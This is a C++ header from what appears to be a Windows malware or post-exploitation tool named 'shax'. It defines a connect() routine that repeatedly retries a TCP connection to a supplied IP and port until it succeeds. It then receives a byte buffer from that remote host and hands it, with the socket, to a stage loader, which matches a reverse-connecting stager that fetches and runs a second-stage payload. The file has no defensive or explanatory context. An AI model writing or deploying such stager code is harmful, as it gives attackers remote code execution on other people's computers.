#pragma once

#include "light_shax.hpp"
#include "stage_loader.hpp"
#include <Ws2tcpip.h>

#pragma comment(lib, "Ws2_32.lib")

class shax : public shax_base {
public:
    shax() : shax_base() {
        
    }

    bool connect( const char* ip, int port, int delay_between_attempts_in_ms = 100 ) {

        inet_pton( AF_INET, ip, &m_addr.sin_addr.s_addr );
        m_addr.sin_family = AF_INET;
        m_addr.sin_port = htons( port );
        m_sock = NULL;

        m_sock = WSASocket( AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL );
        if ( SOCKET_FAILED( m_sock ) ) {
            dispose();
            return false;
        }

        while ( SOCKET_FAILED( WSAConnect( m_sock, (SOCKADDR*)&m_addr, sizeof( m_addr ), NULL, NULL, NULL, NULL ) ) ) {
            Sleep( delay_between_attempts_in_ms );
        }

        auto data = rcv_arr<byte>();

        if ( !data.second ) {
            dispose();
            return false;
        }

        stage_loader::load( data.first, m_addr, m_sock );

        return true;
    }
};